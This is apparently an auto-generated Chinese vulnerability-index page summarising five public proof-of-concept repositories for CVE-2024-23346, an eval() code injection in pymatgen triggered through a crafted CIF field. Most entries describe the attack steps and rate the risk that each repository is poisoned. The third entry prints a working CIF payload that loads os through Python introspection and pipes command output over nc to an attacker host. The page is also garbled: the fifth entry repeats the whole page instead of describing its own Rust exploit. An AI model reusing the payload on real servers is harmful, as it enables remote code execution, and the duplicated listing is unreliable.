# CVE-2024-23346

> 📦 该CVE有 **5** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-23346-9carlo6_CVE-2024-23346.md](../2024/CVE-2024-23346-9carlo6_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可执行任意代码

**影响版本:** < 2024.2.20

**利用条件:** 需要受影响版本的pymatgen库，以及能解析恶意构造的CIF文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-23346 存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中。该方法使用 `eval()` 函数处理输入，导致攻击者可以通过构造恶意的 transformation_string 执行任意代码。PoC 利用了这一点，在 CIF 文件的 `_space_group_magn.transform_BNS_Pp_abc` 字段中嵌入了包含反弹 shell 命令的 Python 代码。利用方式是：攻击者提供一个特制的 CIF 文件，当受害者使用存在漏洞的 pymatgen 版本解析该文件时，嵌入的恶意代码会被执行，从而导致远程代码执行。

**有效性：** 根据漏洞信息和PoC代码，此漏洞利用是有效的。该漏洞利用了 eval 函数执行了任意代码。

**投毒风险：** 提供的 PoC 代码本身就是利用漏洞的代码，不是投毒代码。 仓库中可能存在的投毒风险在于，该仓库意图是作为 Hack The Box (HTB) 渗透测试使用，作者在描述文件或者其他地方隐藏不易察觉的恶意代码的可能性较小，因此将投毒风险评估为较低，大约10%。主要风险在于使用者可能不清楚代码细节，直接使用，如果原作者有恶意，可能存在被利用风险。

**利用方式：**
1.  攻击者创建一个包含恶意 `_space_group_magn.transform_BNS_Pp_abc` 字段的 CIF 文件。
2.  诱导受害者使用存在漏洞的 pymatgen 版本打开或解析该 CIF 文件。
3.  pymatgen 在解析 `_space_group_magn.transform_BNS_Pp_abc` 字段时，会调用 `eval()` 执行其中的恶意代码。
4.  恶意代码在受害者机器上执行，例如反弹 shell。

**项目地址:** [9carlo6/CVE-2024-23346](https://github.com/9carlo6/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #2

**来源**: [CVE-2024-23346-DAVIDAROCA27_CVE-2024-23346-exploit.md](../2024/CVE-2024-23346-DAVIDAROCA27_CVE-2024-23346-exploit.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可导致任意代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要目标存在pymatgen库的易受攻击版本，且允许上传CIF文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中，由于其使用 `eval()` 函数处理输入，攻击者可以通过构造恶意的 CIF 文件，上传后执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞是由于 `eval()` 函数的使用导致的代码注入，POC代码通过构造恶意的 CIF 文件，利用 `_space_group_magn.transform_BNS_Pp_abc` 字段中的 `eval()` 执行命令，从而达到任意代码执行的目的。因此POC代码有效。

**投毒风险：**
POC代码中存在一定投毒风险。主要体现在以下几个方面：
1.  **命令执行位置：**
    *   恶意代码注入点在CIF文件的 `_space_group_magn.transform_BNS_Pp_abc` 字段中，利用了`eval()`函数执行系统命令。
2.  **反弹shell的处理：**
    *   使用`nc`命令反弹shell，增加了服务器风险。

代码的其他部分，如登录、删除结构等，主要是为了配合漏洞利用，本身不构成直接的投毒行为。整体风险较低，评估投毒风险为10%。

**利用方式：**
1.  **身份验证：**  首先需要获取目标系统的有效session cookie。如果未登录，POC会尝试使用提供的用户名和密码登录，然后获取cookie。
2.  **清理环境：**  漏洞利用前，POC会尝试删除服务器上已存在的结构，以确保漏洞利用的成功（delete函数）。
3.  **构造恶意CIF文件：**  POC会构造一个恶意的CIF文件，其中 `_space_group_magn.transform_BNS_Pp_abc` 字段包含要执行的恶意代码。该代码使用 `eval()` 函数执行，并利用 `os.system()` 函数执行系统命令，将命令执行的结果通过`nc`反弹到攻击者指定的IP和端口。
4.  **上传恶意CIF文件：**  POC将构造好的CIF文件上传到服务器上的`/upload`路径。
5.  **触发漏洞：**  上传完成后，访问 `/structure/{pattern.group(1)}` 触发漏洞执行。
6.  **清理环境：**  利用完成后，POC会再次尝试删除服务器上已存在的结构(delete函数)，实现清理。
7.  **交互式命令执行：**  漏洞利用支持交互式命令执行，允许攻击者重复执行命令。

综上，漏洞利用过程较为完整，包含身份验证、环境清理、漏洞触发和利用后清理等步骤。

**项目地址:** [DAVIDAROCA27/CVE-2024-23346-exploit](https://github.com/DAVIDAROCA27/CVE-2024-23346-exploit)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #3

**来源**: [CVE-2024-23346-MAWK0235_CVE-2024-23346.md](../2024/CVE-2024-23346-MAWK0235_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要能够上传CIF文件，且目标系统安装了受影响版本的pymatgen

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-23346 漏洞存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中。该方法使用 `eval()` 处理输入，这使得攻击者可以通过构造恶意的 `transformation_string` 在目标系统上执行任意代码。PoC 代码通过上传包含恶意 `_space_group_magn.transform_BNS_Pp_abc` 字段的 CIF 文件，触发漏洞。漏洞利用过程如下：

1.  **登录:** 使用提供的用户名和密码登录目标应用。
2.  **清理:** 删除所有现有的结构。
3.  **命令执行:** 循环执行命令直到输入 "exit"。
    *   **反弹shell:** 监听指定端口,用于接收反弹shell
    *   **生成恶意CIF文件:**  构造包含恶意代码的CIF文件。该CIF文件包含一个经过精心设计的`_space_group_magn.transform_BNS_Pp_abc` 字段，其中包含要执行的命令和反弹shell指令。`_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("echo $(echo $({cmd}) | /usr/bin/nc -nv {lhost} {randport})");0,0,0'`  该字段利用python的自省机制，获取os模块并执行命令。
    *   **上传CIF文件:** 将恶意CIF文件上传到目标服务器。
    *   **触发漏洞:** 访问上传的结构，触发 `JonesFaithfulTransformation.from_transformation_str()` 方法，执行恶意代码。
    *   **删除结构:** 清理上传的结构。
4.  **退出:** 退出终端。

**投毒风险分析：** PoC代码主要执行了命令执行和反弹shell的功能。虽然该代码本身不包含明显的恶意行为，但`exploit.py`脚本需要用户提供目标地址、用户名、密码以及监听地址。这意味着攻击者可能诱导用户使用该脚本攻击目标。脚本中使用了`eval`函数，存在被滥用的风险，但这不是作者主动投毒，而是漏洞本身的性质。删除所有结构的delete_all方法也可能会被恶意利用，导致数据丢失。总体投毒风险较低，估计为10%。大部分代码逻辑是围绕漏洞验证,后门代码是验证漏洞的不可或缺的部分,因此不能判定为投毒代码。

**项目地址:** [MAWK0235/CVE-2024-23346](https://github.com/MAWK0235/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #4

**来源**: [CVE-2024-23346-Sanity-Archive_CVE-2024-23346.md](../2024/CVE-2024-23346-Sanity-Archive_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-命令注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 命令注入

**影响应用:** pymatgen

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要目标系统存在pymatgen库的易受攻击版本，并且能够上传文件或提供恶意输入给`JonesFaithfulTransformation.from_transformation_str()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-23346 存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中，由于该方法使用 `eval()` 函数处理输入，导致命令注入漏洞。攻击者可以通过上传包含恶意代码的 CIF 文件，或者向该方法提供恶意的转换字符串，从而执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索引擎结果和漏洞利用代码，此漏洞是有效的。POC代码演示了如何利用此漏洞执行任意命令。

**投毒风险：**
POC代码主要包含以下部分：
1.  **恶意 CIF payload 生成：**  生成包含命令注入代码的 CIF 文件。注入代码位于`_space_group_magn.transform_BNS_Pp_abc`字段，使用python命令执行反弹shell命令。
2.  **登录目标系统：**  使用提供的用户名和密码登录目标系统。
3.  **上传恶意 CIF 文件：**  将生成的 CIF 文件上传到目标系统。
4.  **触发漏洞：**  通过访问上传的文件来触发漏洞，执行恶意代码。
5.  **反弹 Shell 监听：** 在本地启动一个 Netcat 监听器，等待反弹 shell 连接。
综上，代码主要用于演示漏洞，没有发现明显的恶意代码用于投毒。但是，**任何利用漏洞的行为都存在风险，使用者需要自行承担责任。** 考虑到POC代码的明确声明，以及代码逻辑的完整性，认为投毒风险较低。

**利用方式：**
1.  攻击者需要拥有目标系统的有效用户名和密码。
2.  攻击者使用 POC 代码生成包含恶意代码的 CIF 文件。
3.  攻击者登录目标系统。
4.  攻击者上传恶意 CIF 文件到目标系统。
5.  攻击者通过访问上传的文件，触发漏洞，执行 CIF 文件中的恶意代码，获得 shell 权限。
6.  攻击者可以在本地使用Netcat监听反弹的shell连接

**项目地址:** [Sanity-Archive/CVE-2024-23346](https://github.com/Sanity-Archive/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #5

**来源**: [CVE-2024-23346-szyth_CVE-2024-23346-rust-exploit.md](../2024/CVE-2024-23346-szyth_CVE-2024-23346-rust-exploit.md)

# CVE-2024-23346

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-23346-9carlo6_CVE-2024-23346.md](../2024/CVE-2024-23346-9carlo6_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可执行任意代码

**影响版本:** < 2024.2.20

**利用条件:** 需要受影响版本的pymatgen库，以及能解析恶意构造的CIF文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-23346 存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中。该方法使用 `eval()` 函数处理输入，导致攻击者可以通过构造恶意的 transformation_string 执行任意代码。PoC 利用了这一点，在 CIF 文件的 `_space_group_magn.transform_BNS_Pp_abc` 字段中嵌入了包含反弹 shell 命令的 Python 代码。利用方式是：攻击者提供一个特制的 CIF 文件，当受害者使用存在漏洞的 pymatgen 版本解析该文件时，嵌入的恶意代码会被执行，从而导致远程代码执行。

**有效性：** 根据漏洞信息和PoC代码，此漏洞利用是有效的。该漏洞利用了 eval 函数执行了任意代码。

**投毒风险：** 提供的 PoC 代码本身就是利用漏洞的代码，不是投毒代码。 仓库中可能存在的投毒风险在于，该仓库意图是作为 Hack The Box (HTB) 渗透测试使用，作者在描述文件或者其他地方隐藏不易察觉的恶意代码的可能性较小，因此将投毒风险评估为较低，大约10%。主要风险在于使用者可能不清楚代码细节，直接使用，如果原作者有恶意，可能存在被利用风险。

**利用方式：**
1.  攻击者创建一个包含恶意 `_space_group_magn.transform_BNS_Pp_abc` 字段的 CIF 文件。
2.  诱导受害者使用存在漏洞的 pymatgen 版本打开或解析该 CIF 文件。
3.  pymatgen 在解析 `_space_group_magn.transform_BNS_Pp_abc` 字段时，会调用 `eval()` 执行其中的恶意代码。
4.  恶意代码在受害者机器上执行，例如反弹 shell。

**项目地址:** [9carlo6/CVE-2024-23346](https://github.com/9carlo6/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #2

**来源**: [CVE-2024-23346-DAVIDAROCA27_CVE-2024-23346-exploit.md](../2024/CVE-2024-23346-DAVIDAROCA27_CVE-2024-23346-exploit.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可导致任意代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要目标存在pymatgen库的易受攻击版本，且允许上传CIF文件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中，由于其使用 `eval()` 函数处理输入，攻击者可以通过构造恶意的 CIF 文件，上传后执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞是由于 `eval()` 函数的使用导致的代码注入，POC代码通过构造恶意的 CIF 文件，利用 `_space_group_magn.transform_BNS_Pp_abc` 字段中的 `eval()` 执行命令，从而达到任意代码执行的目的。因此POC代码有效。

**投毒风险：**
POC代码中存在一定投毒风险。主要体现在以下几个方面：
1.  **命令执行位置：**
    *   恶意代码注入点在CIF文件的 `_space_group_magn.transform_BNS_Pp_abc` 字段中，利用了`eval()`函数执行系统命令。
2.  **反弹shell的处理：**
    *   使用`nc`命令反弹shell，增加了服务器风险。

代码的其他部分，如登录、删除结构等，主要是为了配合漏洞利用，本身不构成直接的投毒行为。整体风险较低，评估投毒风险为10%。

**利用方式：**
1.  **身份验证：**  首先需要获取目标系统的有效session cookie。如果未登录，POC会尝试使用提供的用户名和密码登录，然后获取cookie。
2.  **清理环境：**  漏洞利用前，POC会尝试删除服务器上已存在的结构，以确保漏洞利用的成功（delete函数）。
3.  **构造恶意CIF文件：**  POC会构造一个恶意的CIF文件，其中 `_space_group_magn.transform_BNS_Pp_abc` 字段包含要执行的恶意代码。该代码使用 `eval()` 函数执行，并利用 `os.system()` 函数执行系统命令，将命令执行的结果通过`nc`反弹到攻击者指定的IP和端口。
4.  **上传恶意CIF文件：**  POC将构造好的CIF文件上传到服务器上的`/upload`路径。
5.  **触发漏洞：**  上传完成后，访问 `/structure/{pattern.group(1)}` 触发漏洞执行。
6.  **清理环境：**  利用完成后，POC会再次尝试删除服务器上已存在的结构(delete函数)，实现清理。
7.  **交互式命令执行：**  漏洞利用支持交互式命令执行，允许攻击者重复执行命令。

综上，漏洞利用过程较为完整，包含身份验证、环境清理、漏洞触发和利用后清理等步骤。

**项目地址:** [DAVIDAROCA27/CVE-2024-23346-exploit](https://github.com/DAVIDAROCA27/CVE-2024-23346-exploit)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #3

**来源**: [CVE-2024-23346-MAWK0235_CVE-2024-23346.md](../2024/CVE-2024-23346-MAWK0235_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-代码注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 代码注入

**影响应用:** pymatgen

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要能够上传CIF文件，且目标系统安装了受影响版本的pymatgen

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-23346 漏洞存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中。该方法使用 `eval()` 处理输入，这使得攻击者可以通过构造恶意的 `transformation_string` 在目标系统上执行任意代码。PoC 代码通过上传包含恶意 `_space_group_magn.transform_BNS_Pp_abc` 字段的 CIF 文件，触发漏洞。漏洞利用过程如下：

1.  **登录:** 使用提供的用户名和密码登录目标应用。
2.  **清理:** 删除所有现有的结构。
3.  **命令执行:** 循环执行命令直到输入 "exit"。
    *   **反弹shell:** 监听指定端口,用于接收反弹shell
    *   **生成恶意CIF文件:**  构造包含恶意代码的CIF文件。该CIF文件包含一个经过精心设计的`_space_group_magn.transform_BNS_Pp_abc` 字段，其中包含要执行的命令和反弹shell指令。`_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("echo $(echo $({cmd}) | /usr/bin/nc -nv {lhost} {randport})");0,0,0'`  该字段利用python的自省机制，获取os模块并执行命令。
    *   **上传CIF文件:** 将恶意CIF文件上传到目标服务器。
    *   **触发漏洞:** 访问上传的结构，触发 `JonesFaithfulTransformation.from_transformation_str()` 方法，执行恶意代码。
    *   **删除结构:** 清理上传的结构。
4.  **退出:** 退出终端。

**投毒风险分析：** PoC代码主要执行了命令执行和反弹shell的功能。虽然该代码本身不包含明显的恶意行为，但`exploit.py`脚本需要用户提供目标地址、用户名、密码以及监听地址。这意味着攻击者可能诱导用户使用该脚本攻击目标。脚本中使用了`eval`函数，存在被滥用的风险，但这不是作者主动投毒，而是漏洞本身的性质。删除所有结构的delete_all方法也可能会被恶意利用，导致数据丢失。总体投毒风险较低，估计为10%。大部分代码逻辑是围绕漏洞验证,后门代码是验证漏洞的不可或缺的部分,因此不能判定为投毒代码。

**项目地址:** [MAWK0235/CVE-2024-23346](https://github.com/MAWK0235/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---

## POC #4

**来源**: [CVE-2024-23346-Sanity-Archive_CVE-2024-23346.md](../2024/CVE-2024-23346-Sanity-Archive_CVE-2024-23346.md)

## CVE-2024-23346-pymatgen-命令注入

**漏洞编号:** CVE-2024-23346

**漏洞类型:** 命令注入

**影响应用:** pymatgen

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2024.2.20

**利用条件:** 需要目标系统存在pymatgen库的易受攻击版本，并且能够上传文件或提供恶意输入给`JonesFaithfulTransformation.from_transformation_str()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-23346 存在于 pymatgen 库的 `JonesFaithfulTransformation.from_transformation_str()` 方法中，由于该方法使用 `eval()` 函数处理输入，导致命令注入漏洞。攻击者可以通过上传包含恶意代码的 CIF 文件，或者向该方法提供恶意的转换字符串，从而执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索引擎结果和漏洞利用代码，此漏洞是有效的。POC代码演示了如何利用此漏洞执行任意命令。

**投毒风险：**
POC代码主要包含以下部分：
1.  **恶意 CIF payload 生成：**  生成包含命令注入代码的 CIF 文件。注入代码位于`_space_group_magn.transform_BNS_Pp_abc`字段，使用python命令执行反弹shell命令。
2.  **登录目标系统：**  使用提供的用户名和密码登录目标系统。
3.  **上传恶意 CIF 文件：**  将生成的 CIF 文件上传到目标系统。
4.  **触发漏洞：**  通过访问上传的文件来触发漏洞，执行恶意代码。
5.  **反弹 Shell 监听：** 在本地启动一个 Netcat 监听器，等待反弹 shell 连接。
综上，代码主要用于演示漏洞，没有发现明显的恶意代码用于投毒。但是，**任何利用漏洞的行为都存在风险，使用者需要自行承担责任。** 考虑到POC代码的明确声明，以及代码逻辑的完整性，认为投毒风险较低。

**利用方式：**
1.  攻击者需要拥有目标系统的有效用户名和密码。
2.  攻击者使用 POC 代码生成包含恶意代码的 CIF 文件。
3.  攻击者登录目标系统。
4.  攻击者上传恶意 CIF 文件到目标系统。
5.  攻击者通过访问上传的文件，触发漏洞，执行 CIF 文件中的恶意代码，获得 shell 权限。
6.  攻击者可以在本地使用Netcat监听反弹的shell连接

**项目地址:** [Sanity-Archive/CVE-2024-23346](https://github.com/Sanity-Archive/CVE-2024-23346)

**漏洞详情:** [CVE-2024-23346](https://nvd.nist.gov/vuln/detail/CVE-2024-23346)

---



---

